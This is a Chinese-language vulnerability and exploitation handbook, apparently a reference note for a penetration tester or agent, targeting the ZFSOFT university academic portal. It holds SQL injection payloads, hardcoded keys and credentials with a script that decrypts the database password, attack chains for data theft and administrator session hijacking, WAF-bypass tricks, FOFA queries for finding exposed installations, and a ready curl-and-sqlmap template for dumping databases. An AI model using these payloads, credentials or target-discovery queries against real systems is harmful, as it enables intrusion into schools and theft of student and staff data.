---
name: kb_zhengfang_master
description: 正方教务/门户系统源码级漏洞手册 — 架构/代码审计/全漏洞面/测试流程/DWR深度利用/硬编码密钥/攻击链
metadata:
  type: reference
  product: 正方软件门户系统 (ZFSOFT SMP Portal)
  version: 4.4.4
  source: D:/Desktop/正方教务系统源码 代码审计
  updated: 2026-06-20
---

# 正方教务系统 (ZFSOFT) 源码级漏洞手册

## 一、系统架构

```
前端: JSP + Portlet 机制 + DWR AJAX
MVC: Struts 1.x (portal.do)
IoC: Spring
ORM: 自定义 DAO 父类 (拼接 SQL → PreparedStatement)
RPC: DWR 2.0.6 (/dwr/)
WebService: Apache Axis (/services/)
数据库: Oracle (ojdbc14.jar)
中间件: WebLogic / Tomcat
编辑器: eWebEditor / FCKEditor
```

### 项目结构

```
zfcommon.jar     — 公共组件 (DAO基类、工具类、加密、eWebEditor)
zfportal.jar     — 门户核心 (Portlet、Action、Service)
zfcacommon.jar   — 校园公共模块 (业务DAO)
```

### 请求分发链路

```
/dwr/call/plain/statAjax.getWzStatByDateAndWzdm
  → DWR Servlet → StatAjax.java → WzStatServiceImpl → StatDAO
    → 拼接 SQL 字符串 → PreparedStatement 执行 (无参数化!)

/portal.do?theAction=setup&id=xxx
  → Struts ActionServlet → BaseAction → 反射调用方法
    → Service → DAO (同上 SQL 拼接)
```

---

## 二、全漏洞面 (代码审计确认)

### 2.1 SQL 注入 — 最高危 (8处确认)

**根因**: `com.zfsoft.dao.DAO` 父类提供直接执行拼接 SQL 的便利方法:

```java
// DAO.java — 无参数化,直接执行字符串
public String getOneRs(String sql)      // 查询单值
public boolean runUpdate(String sql)    // 执行更新
public String runewUpdate(String sql)   // 更新+错误
public List<String> getRealRow(String sql)  // 列表查询
public ResultSet getPageRs(String sql)  // 分页(存过)
```

子类调用方自由拼接传入 = 全系统潜在一类漏洞。

#### 注入点 #1: StatAjax DWR (P0 最高优先级)

DWR 配置 (`WEB-INF/dwr-stat.xml`) 直接暴露 4 个方法为 JavaScript:

```
/dwr/call/plain/statAjax.getWzStat
/dwr/call/plain/statAjax.getWzStatByDate
/dwr/call/plain/statAjax.getWzStatByDateAndWzdm  ← 5个参数可注入
/dwr/call/plain/statAjax.getWzStatByTimeTypeAndWzdm
```

| 方法 | 注入参数 | 闭合方式 | 上下文 |
|------|----------|---------|--------|
| getWzStatByDateAndWzdm | dwdm, wzdm, lmdm | `' param '` 单引号 | WHERE 子句 |
| getWzStatByDateAndWzdm | from, to | `TO_DATE('param',...)` | TO_DATE() 内 |
| getWzStatByTimeTypeAndWzdm | dwdm, wzdm, lmdm | `' param '` | WHERE 子句 |
| getWzStat | linage | 字符串拼接 | WHERE 子句 |

**拼接代码** (StatDAO.java):
```java
sqlQuery_whereDM.append(" H.FBDW='" + dwdm + "' AND ");
sqlQuery_whereDM.append(" H.WZDM='" + wzdm + "' AND ");
sqlQuery_whereDM.append(" H.LMDM='" + lmdm + "' AND ");
sqlQuery.append(" H.TJSJ>=TO_DATE('" + from + "','YYYY-MM-DD') AND ");
```

#### 注入点 #2: GrxxDao 个人信息模块
```java
// GrxxDao.java:94
String arg = getOneRs("select * from jsqx_xxws where jsdm='" + jsdm + "'");
```

#### 注入点 #3: StatDAO.delete() 表名注入
```java
// StatDAO.java:168
String sql = "delete from " + tableName;
this.ps = this.conn.prepareStatement(sql);
```

#### 注入点 #4: BaseSqlStr 权限查询类 (8个公共方法全部拼接)
```java
// yhm, wzdm, lmdm 参数全部用 + 拼接
jsqx_wzxxb_sql(yhm, wzdm)  // "yhm =" + yhm, "wzdm =" + wzdm
jsqx_zfwzxxb_sql(yhm, wzdm)
jsqx_lmgl_sql(yhm, lmdm)
buildsql_yhm_yhjs(yhm)     // 8处 "yhm = '" + yhm + "'"
// ... 共8个方法
```

#### 注入点 #5: zfcacommon.jar DAO
```java
YwxtdzxxbDAO.java:193  → parameter.getYwxtdm()
TysfyhbDAO.java:477    → parameter.getNodeid()
YrdgxxbDAO.java:125    → parameter.getDwh() + getGwdm()
JsyhdzbDAO.java:188    → jsdm
JsyhdzbDAO.java:214    → dwdm
```

#### 注入点 #6: 分页存储过程传参
```java
// BasicDAO.getPageRs()
this.cstmt.setString(1, sql);  // sql 由调用方拼接后传入
```

### 2.2 命令注入

| 文件 | 代码 | 触发 |
|------|------|------|
| Tool.java:492 | `Runtime.getRuntime().exec("nbtstat -A " + remotePcIP)` | 获取客户端 MAC 地址功能 |

### 2.3 硬编码密钥/凭据

| 密钥类型 | 位置 | 值 |
|----------|------|-----|
| DES 加密密钥 | Key.java:7 | `7EV/Zzutjzg=` (Base64) |
| RSA 2048 私钥 | MailNetsSupport.java:22 | 完整 DER 编码(全文) |
| 邮箱 API Key | YiyouMailSupport.java:161 | `35c51afdb3caa33d1e9b36802c5d79b8` |
| SSO DB 密码 | zfssoconfig.properties | `zftest_cll / setf?)]S+t` |
| DB 密码(加密) | dataSource.properties | `HpgwK09U9WqVbIyfBAUhPA==` (DES) |

**DB 密码解密**:
```python
from Crypto.Cipher import DES
import base64
key = base64.b64decode("7EV/Zzutjzg=")
ct = base64.b64decode("HpgwK09U9WqVbIyfBAUhPA==")
cipher = DES.new(key, DES.MODE_ECB)
print(cipher.decrypt(ct).decode().strip())
```

### 2.4 XXE 注入 (8处)

所有 `SAXReader` 实例均未禁用外部实体:

| 文件 | 上下文 |
|------|--------|
| YiyouMailSupport.java:82 | 邮件API XML解析 |
| QuarkMailSupport.java:35 | 邮件API XML解析 |
| WSCall.java:47 | WebService响应解析 |
| XmlUtil.java:85 | 通用XML工具 |
| CoremailHeper.java:165 | Coremail响应解析 |
| CommanAction.java:388 | 基础Action |
| EditWebhelper.java:66 | 编辑器配置读取 |
| ConnectorServlet.java:70 | FCKEditor连接器 |

### 2.5 eWebEditor 攻击面

`zfcommon.jar/com/zfsoft/ewebeditor/server/upload.java`:

| 功能 | 风险 |
|------|------|
| SaveRemoteFile() | SSRF — 从用户提供的 URL 下载文件 |
| 文件上传 | 扩展名白名单可从 .jsp 配置文件读取 |
| sCusDir 路径穿越 | 仅阻止 `./` 未阻止 `..\` |

### 2.6 LDAP 注入

```java
// UserDao.java:26
String dn = "uid=" + uid + ",ou=" + userType + "," + LdapConfig.peasedn + LdapConfig.ldapRoot;
```

### 2.7 其他安全问题

| 类型 | 详情 |
|------|------|
| CSRF | 全系统零 CSRF Token |
| 认证绕过风险 | BaseAction 不验证 user 非空就反射调用 |
| 存储型 XSS | Portlet display_name 从 DB 拼入 HTML (BasePortlet.java:40-103) |
| 弱加密 | DES 用于 DB 密码 (ECB模式) |
| 弱哈希 | MD5 用于签名 (多处) |
| SQL 日志泄露 | Tool.print(sql) 输出完整 SQL |
| 内网拓扑泄露 | 6个配置文件含内网 IP |
| 调试信息 | printStackTrace() 生产环境保留 |

---

## 三、攻击链

### 攻击链 #1: DWR SQLi → 数据窃取 (P0 最高)
```
/dwr/interface/statAjax.js → getWzStatByDateAndWzdm()
→ dwdm='||(CASE WHEN ... THEN TO_CHAR(1/0) ELSE '1' END)||'
→ Oracle 报错/布尔盲注 → sqlmap 接管 → 脱库
```

### 攻击链 #2: SQLi → 存储XSS → 管理员劫持 (P0)
```
SQLi 写入 dm_xb_kjcsxxb → 修改 Portlet display_name
→ BasePortlet 渲染时拼入 HTML → XSS → 窃取管理员 Session
```

### 攻击链 #3: eWebEditor SSRF → 内网横向 (P1)
```
eWebEditor_UploadText → SaveRemoteFile(内网URL) → 内网探测
```

### 攻击链 #4: 配置泄露 → DB 密码解密 → 数据窃取 (P1)
```
/WEB-INF/properties/dataSource.properties → DES 密文
→ Key.java 硬编码密钥 → DES ECB 解密 → 明文 DB 密码
```

### 攻击链 #5: LDAP 注入 → SSO 绕过 (P1)
```
CAS 登录口 → uid=admin)(|(uid=*) → LDAP 注入绕过
```

---

## 四、Oracle 注入利用技术速查

| 技术 | 函数 |
|------|------|
| 报错注入 | `TO_CHAR(1/0)`, `UTL_INADDR.GET_HOST_NAME()`, `CTXSYS.DRITHSX.SN()` |
| 布尔盲注 | `ASCII(SUBSTR(...))` + `NVL2(NULLIF(...))` / `DECODE()` |
| 时间盲注 | `DBMS_LOCK.SLEEP()`, `DBMS_PIPE.RECEIVE_MESSAGE()` |
| OOB外带 | `UTL_HTTP.REQUEST()`, `UTL_INADDR.GET_HOST_ADDRESS()` |
| 联合查询 | ORDER BY 探测列数 → UNION SELECT |
| RCE链 | Java Stored Procedure (需 DBA) |

---

## 五、DWR 协议细节

### DWR 请求格式

```
POST /zfsmp/dwr/call/plain/statAjax.getWzStatByDateAndWzdm HTTP/1.1
Content-Type: text/plain

callCount=1
c0-scriptName=statAjax
c0-methodName=getWzStatByDateAndWzdm
c0-id=0
batchId=0
instanceId=0
page=/zfsmp/portal.do
scriptSessionId=
c0-param0=string:kjdm123
c0-param1=string:2024-01-01
c0-param2=string:2024-12-31
c0-param3=string:PAYLOAD_HERE
c0-param4=string:02030003
c0-param5=string:02030003
```

### 参数编码规则

```
c0-param<N>=string:<value>     # 字符串参数
c0-param<N>=number:<value>     # 数字参数
c0-param<N>=boolean:<value>    # 布尔参数
c0-param<N>=Object:<json>      # 对象参数
```

### DWR 接口枚举

```bash
# 1. 获取所有暴露的 Ajax 类
curl -sk "TARGET/dwr/index.html"

# 2. 获取每个类的方法签名
curl -sk "TARGET/dwr/interface/statAjax.js"
curl -sk "TARGET/dwr/interface/portalAjax.js"

# 3. 批量下载 interface/ 下所有 JS
for name in statAjax portalAjax messageAjax fileAjax; do
    curl -sk "TARGET/dwr/interface/${name}.js" -o "${name}.js"
done
```

---

## 六、WAF 绕过 (Oracle 场景)

### 优先顺序

1. **换 Content-Type**: `text/plain` → `multipart/form-data`
2. **函数替换**: `SUBSTR` → `REGEXP_COUNT` / `LTRIM+NCHR+ASCII`; `CHR` → `NCHR`
3. **无引号字符串**: `CONCAT(TO_CHAR(NCHR(65)),TO_CHAR(NCHR(66)))` = 'AB'
4. **幽灵比特**: HPP (同名参数多次发送), 参数位置交换
5. **编码**: URL编码/双编码/Unicode/大小写混合/空白字符(Tab%09/换行%0a)
6. **NOT vs =**: `<> 'x'` 替代 `= 'x'`

### Oracle 被拦时的替换矩阵

| 被封 | 替换为 |
|------|--------|
| SUBSTR | LTRIM(column, NCHR(65)) → 去掉首字母A后的剩余部分 |
| CHR | NCHR |
| `'` 引号 | CONCAT(TO_CHAR(NCHR(65)), TO_CHAR(NCHR(66))) |
| ASCII | ORA_HASH 数值比较 |
| `=` | `<>` 反向逻辑 / `LIKE` / `IN` |
| SYS_CONTEXT | (USER) / (SELECT banner FROM v$version WHERE ROWNUM=1) |

---

## 七、路径发现

```
P0 (必测):
  /dwr/index.html              — DWR 接口列表
  /dwr/interface/statAjax.js   — 统计模块 DWR
  /dwr/interface/portalAjax.js — 门户 DWR
  /portal.do                   — Struts 入口
  /zfsmp/                      — 后台管理
  /services/                   — Axis WebService
  /ewebeditor/jsp/upload.jsp   — eWebEditor

P1 (高价值):
  /WEB-INF/web.xml
  /WEB-INF/properties/dataSource.properties
  /WEB-INF/zfssoconfig.properties
  /WEB-INF/conf.xml
  /dwr/engine.js
  /dwr/util.js

P2 (补充):
  /manager/html               — Tomcat 管理
  /host-manager/html
  /axis2/services/
  /backup/ backup.zip *.sql
```

---

## 八、指纹识别

### FOFA
```
app="正方软件-教务系统"
body="zfportal" || body="zfsmp" || body="正方软件"
title="正方教务管理系统"
"/dwr/interface/statAjax.js"
"/portal.do"
```

### 响应特征
- `JSESSIONID` → `zfportal_JSESSIONID` (WebLogic)
- Server: `WebLogic` / `Apache-Coyote`
- HTML: `portlet_` / `portlet_box_` / `xtkjdm` 属性
- HTML title: `正方教务管理系统`
- HTML copyright: `Copyright © ZFSoft`

### JS 特征
- `ZFWebPrint.dll` ActiveX 控件
- `dwr/engine.js` 存在
- `/dwr/interface/statAjax.js` 存在

---

## 九、实战验证模板

### Step 1: 指纹确认 (30秒)
```bash
curl -sk "TARGET/dwr/index.html" | head -20
curl -sk "TARGET/portal.do" -o /dev/null -w "%{http_code}"
```

### Step 2: DWR 接口枚举 (1分钟)
```bash
curl -sk "TARGET/dwr/index.html" | grep -oP 'interface/[^"]+\.js'
```

### Step 3: SQL 注入探测 (2分钟)
```bash
# 布尔差异测试
curl -sk -X POST 'TARGET/dwr/call/plain/statAjax.getWzStatByDateAndWzdm' \
  -H 'Content-Type: text/plain' \
  --data "callCount=1
c0-scriptName=statAjax
c0-methodName=getWzStatByDateAndWzdm
c0-id=0
batchId=0
instanceId=0
page=/zfsmp/portal.do
scriptSessionId=
c0-param0=string:kjdm123
c0-param1=string:2024-01-01
c0-param2=string:2024-12-31
c0-param3=string:'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)||'
c0-param4=string:02030003
c0-param5=string:02030003
" -w "\nHTTP %{http_code} Size %{size_download}"
```

### Step 4: 确认注入 → sqlmap 接管
```bash
python <workdir>/tools/sqlmap-1.8/sqlmap.py \
  -u "TARGET/dwr/call/plain/statAjax.getWzStatByDateAndWzdm" \
  --data="..." --param-del="\n" \
  --technique E -p c0-param3 --dbms oracle --batch
```

---

## 十、关联知识库

- [[kb_zhengfang_portal_code_audit]] — 源码审计原始记录
- [[project_zhengfang_sqli_review_202606]] — ORDER BY 注入通杀复盘
- [[kb_sqli_ltrim_nchr_ascii_bypass]] — Oracle SUBSTR WAF 绕过
- [[kb_src_sqli_practical_workflow_2026]] — SQL 注入实战工作流
- [[kb_src_waf_bypass]] — WAF 绕过速查
- [[edu_src_jiaowu]] — 教务系统专有漏洞
